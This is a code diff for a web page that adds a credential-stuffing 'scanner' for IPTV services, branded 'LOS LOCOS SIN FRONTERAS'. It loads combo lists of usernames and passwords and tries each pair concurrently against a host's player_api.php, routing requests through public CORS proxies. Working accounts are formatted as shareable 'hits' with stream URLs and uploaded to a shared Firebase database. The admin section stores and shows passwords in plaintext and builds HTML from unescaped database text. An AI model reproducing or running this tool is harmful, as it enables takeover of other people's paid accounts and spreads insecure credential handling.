+        // ================= LOGICA ESCÁNER: LOS LOCOS SIN FRONTERAS =================
+        let isRunning = false, stopRequested = false, currentScanHits = [];
+        const CORS_PROXIES = ['https://corsproxy.io/?{url}', 'https://api.allorigins.win/raw?url={url}'];
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+        function playHitSound() {
+            if (!document.getElementById('soundToggle').checked) return;
+            const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain();
+            osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
+            osc.connect(gain); gain.connect(audioCtx.destination);
+            osc.start(); osc.stop(audioCtx.currentTime + 0.5);
+        }
+
+        async function validate(host, user, pass) {
+            try {
+                const cleanHost = host.trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
+                const url = `http://${cleanHost}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+                const proxy = CORS_PROXIES[Math.floor(Math.random() * CORS_PROXIES.length)];
+                const finalUrl = document.getElementById('useCors').checked ? proxy.replace('{url}', encodeURIComponent(url)) : url;
+
+                const res = await fetch(finalUrl); const data = await res.json();
+                if (data?.user_info && (data.user_info.auth == 1)) {
+                    const info = data.user_info;
+                    if (info.status === 'Expired' || info.status === 'Banned') return null;
+                    return { 
+                        user, pass, host: cleanHost, status: info.status || "Active",
+                        exp: info.exp_date ? new Date(info.exp_date * 1000).toISOString().replace('T',' ').split('.')[0] : "Ilimitada",
+                        max: info.max_connections || "1", active: info.active_cons || "0"
+                    };
+                }
+            } catch (e) {}
+            return null;
+        }
+
+        function formatHitText(h) {
+            const m3u = `http://${h.host}/get.php?username=${h.user}&password=${h.pass}&type=m3u_plus`;
+            return `╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ 📡 LOS LOCOS SIN FRONTERAS 📡
+├● 🎧💥🔥 GRUPO L.S.F 🔥💥🎧
+├●🔸🌐Host ➤ http://${h.host}
+├●♦️🌍Real ➤ ${h.host}
+├🍁LSF 🔹
+├●🔸📡Port ➤ 80/8080
+├●♦️👩👩‍User ➤ ${h.user}
+├●♦️🔑🔑Pass ➤ ${h.pass}
+├─●🔸📆Exp ➤ ${h.exp}
+├─●🔸─●🔸─●🔸INTERNACIONAL
+├─●🔸Country➤ Global
+├──●🔸👩ActCon ➤ ${h.active}
+├──●🔸👪MaxCon ➤ ${h.max} 
+├─●🔸M3UValid ➤ ONLINE
+├─●🔸M3U url  ➤ ${m3u}
+├─●🅳🅸🆁🅴🅲🆃🅾─➤
+╰─➤🌟LOS LOCOS SIN FRONTERAS PREMIUM 24/7🌟`;
+        }
+
+        document.getElementById('startBtn').onclick = async () => {
+            const host = document.getElementById('hostInput').value.trim();
+            const concurrency = parseInt(document.getElementById('concurrencyInput').value) || 20;
+            if (!host) return alert("Ingresa un Host");
+
+            let allLines = [];
+            const files = [document.getElementById('comboFile1'), document.getElementById('comboFile2'), document.getElementById('comboFile3')];
+            for (let f of files) if (f.files[0]) allLines = allLines.concat((await f.files[0].text()).split(/\r?\n/));
+            if (document.getElementById('comboText').value) allLines = allLines.concat(document.getElementById('comboText').value.split(/\r?\n/));
+                
+            const combos = allLines.filter(l => l.includes(':')).map(l => {
+                const p = l.split(':'); return [p[0].trim(), p[1].trim()];
+            });
+            if (combos.length === 0) return alert("Sin combos válidos");
+
+            isRunning = true; stopRequested = false; currentScanHits = [];
+            document.getElementById('hitsContainer').innerHTML = '';
+            document.getElementById('startBtn').disabled = true; document.getElementById('stopBtn').disabled = false;
+            let processed = 0, index = 0;
+
+            async function worker() {
+                while (index < combos.length && !stopRequested) {
+                    const currentIdx = index++; const [u, p] = combos[currentIdx];
+                    const hit = await validate(host, u, p);
+                    if (hit) {
+                        currentScanHits.push(hit); playHitSound();
+                        const formatted = formatHitText(hit);
+                        
+                        // Guardar en la Web (Firebase Firestore) ordenado por tiempo de servidor
+                        try {
+                            await addDoc(collection(db, "hits_escaneados"), {
+                                host: hit.host, user: hit.user, pass: hit.pass, exp: hit.exp, max: hit.max, active: hit.active,
+                                textoFormateado: formatted, contadorCopias: 0, timestamp: serverTimestamp()
+                            });
+                        } catch(err){}
+
+                        const div = document.createElement('div'); div.className = 'hit-block';
+                        div.innerHTML = `[Guardando en Servidor Web...] <br>${formatted}`;
+                        document.getElementById('hitsContainer').prepend(div);
+                        document.getElementById('hitsCountDisplay').innerText = `Hits Reales: ${currentScanHits.length}`;
+                    }
+                    processed++;
+                    document.getElementById('progressBarFill').style.width = (processed / combos.length) * 100 + '%';
+                    document.getElementById('progressText').innerText = `Procesados: ${processed} / ${combos.length}`;
+                }
+            }
+            const pool = Array.from({ length: Math.min(concurrency, combos.length) }, () => worker());
+            await Promise.all(pool);
+
+            isRunning = false; document.getElementById('startBtn').disabled = false; document.getElementById('stopBtn').disabled = true;
+            document.getElementById('saveBtn').disabled = currentScanHits.length === 0;
+        };
+
+        document.getElementById('stopBtn').onclick = () => stopRequested = true;
+        
+        document.getElementById('saveBtn').onclick = () => {
+            const txt = currentScanHits.map(formatHitText).join('\n\n' + '='.repeat(30) + '\n\n');
+            const blob = new Blob([txt], { type: 'text/plain' }); const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob); a.download = `HITS_LOS_LOCOS_SIN_FRONTERAS.txt`; a.click();
+        };
+
+        // Escuchar y desplegar de Firebase todos los Hits ordenados por Fecha con contador de Copias
+        function escucharHitsDB() {
+            const q = query(collection(db, "hits_escaneados"), orderBy("timestamp", "desc"));
+            onSnapshot(q, (snapshot) => {
+                const list = document.getElementById('dbHitsList');
+                list.innerHTML = "";
+                snapshot.forEach((docSnap) => {
+                    const id = docSnap.id; const data = docSnap.data();
+                    const div = document.createElement('div');
+                    div.className = "hit-block-db";
+                    div.style.position = "relative";
+                    
+                    let dateStr = "Fecha Pendiente";
+                    if(data.timestamp) { dateStr = new Date(data.timestamp.seconds * 1000).toLocaleString(); }
+
+                    div.innerHTML = `
+                        <div style="color:var(--wa-teal); font-size:11px; margin-bottom:4px;">📅 Escaneado el: ${dateStr}</div>
+                        <pre style="white-space: pre-wrap; font-size:12px; color:#fff;">${data.textoFormateado}</pre>
+                        <div><span class="counter-badge">Copias: ${data.contadorCopias || 0}</span></div>
+                        <button class="copy-btn" onclick="copiarYContarHit('${id}', \`${data.textoFormateado.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`)">COPIAR HIT</button>
+                    `;
+                    list.appendChild(div);
+                });
+            });
+        }
+
+        // Sumar +1 al contador de copias en la base de datos de forma colectiva
+        window.copiarYContarHit = async function(id, texto) {
+            navigator.clipboard.writeText(texto).then(async () => {
+                alert("Hit Copiado. Se actualizó el contador en el servidor.");
+                try {
+                    await updateDoc(doc(db, "hits_escaneados", id), {
+                        contadorCopias: increment(1)
+                    });
+                } catch(e){}
+            }).catch(() => alert("No se pudo copiar automáticamente."));
+        };
+
+        // ================= ADMINISTRADORES EN RED =================
         document.getElementById('btnCrearAdmin').onclick = async () => {
             const nomId = document.getElementById('newAdminName').value.trim();
             const mail = document.getElementById('newAdminEmail').value.trim();
             const pass = document.getElementById('newAdminPass').value.trim();
-
-            if (!nomId || !mail || !pass) return alert("Asigna credenciales completas para guardar.");
+            if (!nomId || !mail || !pass) return alert("Asigna credenciales completas.");
 
             try {
                 await addDoc(collection(db, "usuarios_vip"), {
-                    identificacion: nomId,
-                    nombre: nomId,
-                    email: mail,
-                    pass: pass,
-                    role: "admin"
+                    identificacion: nomId, nombre: nomId, email: mail, pass: pass, role: "admin"
                 });
-
-                alert("Nuevo Administrador registrado correctamente. Ya puede iniciar sesión.");
-                document.getElementById('newAdminName').value = "";
-                document.getElementById('newAdminEmail').value = "";
-                document.getElementById('newAdminPass').value = "";
-            } catch (e) {
-                alert("Error de escritura en red al guardar el administrador.");
-            }
+                alert("Registrado.");
+                document.getElementById('newAdminName').value = ""; document.getElementById('newAdminEmail').value = ""; document.getElementById('newAdminPass').value = "";
+            } catch (e) { alert("Error de red."); }
         };
 
         function escucharAdmins() {
             onSnapshot(collection(db, "usuarios_vip"), (snapshot) => {
-                const list = document.getElementById('adminsList');
-                list.innerHTML = "";
-
+                const list = document.getElementById('adminsList'); list.innerHTML = "";
                 snapshot.forEach((docSnap) => {
-                    const data = docSnap.data();
-                    const id = docSnap.id;
-
-                    const item = document.createElement('div');
-                    item.className = "member-item";
+                    const data = docSnap.data(); const id = docSnap.id;
+                    const item = document.createElement('div'); item.className = "member-item";
                     item.innerHTML = `
                         <strong>👤 ${data.nombre || data.identificacion}</strong>
                         <span class="member-meta">Correo: ${data.email} | Clave: ${data.pass}</span>
-                        <button class="btn-mini" style="background:var(--red-sub); margin-top:5px; width:fit-content; align-self:flex-end;" onclick="removerAdmin('${id}')">Revocar Permisos</button>
+                        <button class="btn-mini" style="background:var(--red-sub); margin-top:5px; width:fit-content; align-self:flex-end;" onclick="removerAdmin('${id}')">Revocar</button>
                     `;
                     list.appendChild(item);
                 });
@@ -559,15 +665,11 @@
         }
 
         window.removerAdmin = async (id) => {
-            if (confirm("¿Estás seguro de que deseas eliminar a este administrador del sistema?")) {
-                await deleteDoc(doc(db, "usuarios_vip", id));
-            }
+            if (confirm("¿Eliminar administrador?")) await deleteDoc(doc(db, "usuarios_vip", id));
         };
 
-        // Salida limpia
         document.getElementById('btnSalir').onclick = () => {
-            localStorage.removeItem('andy_sys_session');
-            window.location.reload();
+            localStorage.removeItem('andy_sys_session'); window.location.reload();
         };
     </script>
 </body>
